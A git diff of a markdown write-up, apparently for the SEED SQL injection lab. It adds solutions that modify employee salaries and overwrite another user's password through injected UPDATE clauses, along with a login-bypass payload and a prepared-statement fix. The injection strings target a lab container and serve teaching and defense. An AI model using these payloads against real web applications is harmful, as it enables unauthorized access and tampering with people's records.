@@ -49,7 +49,6 @@ Web applications often take user *inputs* to construct SQL queries for retrievin
     $ docksh 50 # web application container
     ```
 
----
 ## Task 1: Get Familiar with SQL Statements:
 
 The data used by our web application is stored in a MySQL database, which is **hosted on our MySQL container**. We have created a database called `sqllab_users`, which contains a table called `credential`. The table stores the personal information (e.g. eid, password, salary, ssn, etc.) of every employee.
@@ -73,7 +72,7 @@ Use a SQL command to print all the profile information of the employee *Alice*:
 ```sql
 select * from credential where Name='Alice';
 ```
----
+
 ## Task 2: SQL Injection Attack on *SELECT* Statement:
 
 ### Task 2.1: SQL Injection Attack from webpage.
@@ -87,7 +86,7 @@ select * from credential where Name='Alice';
     where name= 'Admin' #' and password='whatever';
     ```
     ```sql
-    --it should be something like this normally:
+    --normally it'd be something like this:
     where name= 'Admin' and password='admin-passwd';
     ```
 
@@ -115,3 +114,81 @@ The same as Task 2.1, but without using the webpage.
 - Then, export the html output into a `file.html` and open it. It contains all information we need but lacks the layout controls by a specified `CSS` file.
 ---
 ### Task 2.3: Append a new SQL statement.
+
+Using an SQL query like this:
+```sql
+INSERT INTO credential (name, eid) VALUES ('Hello','123456');
+```
+Username: `a'; INSERT INTO credential (name, eid) VALUES ('Hello','123456') #`
+
+![alt text](image.png)
+It doesn't support for multiple queries as we can see.
+
+## Task 3: SQL Injection Attack on *UPDATE* Statement:
+
+### Task 3.1: Modify your own salary.
+Log in as Alice and modify any field with:
+```sql
+', Salary=1000000 where name='Alice'#
+```
+---
+### Task 3.2: Modify other people’ salary.
+Log in as Alice and modify any field with:
+```sql
+', Salary=1 where name='Boby'#
+```
+---
+### Task 3.3: Modify other people’ password.
+Use a SHA1 hash function generator:
+
+![alt text](image-1.png)
+
+Log in as Alice and modify any field with:
+```sql
+', password='b0fdeba62faee00f08540fdd2d312404e5079938' where name='Boby' #
+```
+Check if Boby's password was modified:
+
+![alt text](image-2.png)
+
+## Task 4: Countermeasure — Prepared Statement:
+
+1. Inside the lab setup folder, We'll modify the `unsafe.php` program inside the `image_www/Code/defense` folder.
+
+    These are the lines that are *unsafe*:
+    ```php
+    $result = $conn->query("SELECT id, name, eid, salary, ssn
+                            FROM credential
+                            WHERE name= '$input_uname' and Password= '$hashed_pwd'");
+    if ($result->num_rows > 0) {
+    // only take the first row 
+    $firstrow = $result->fetch_assoc();
+    $id     = $firstrow["id"];
+    $name   = $firstrow["name"];
+    $eid    = $firstrow["eid"];
+    $salary = $firstrow["salary"];
+    $ssn    = $firstrow["ssn"];
+    }
+    ```
+
+    We'll change them to:
+    ```php
+    $stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
+                            FROM credential
+                            WHERE name=? and Password=?");
+
+    $stmt->bind_param("ss", $input_uname, $hashed_pwd);
+    $stmt->execute();
+    $stmt->bind_result($id, $name, $eid, $salary, $ssn);
+    $stmt->fetch();
+    ```
+
+    Now, the query structure cannot be changed by user inputs, and inputs are **Data-Only**, so SQL commands from user inputs are ignored.
+
+2. After you are done, you need to **rebuild and restart the container**, or the changes will not take effect. Also, make sure to move all the files inside the `defense` folder to the `code` folder because of the `docker-compose.yml`.
+
+3. Open the website and see if the attacks still work. (They shouldn't).
+
+    ![alt text](image-3.png)
+
+    ![alt text](image-4.png)
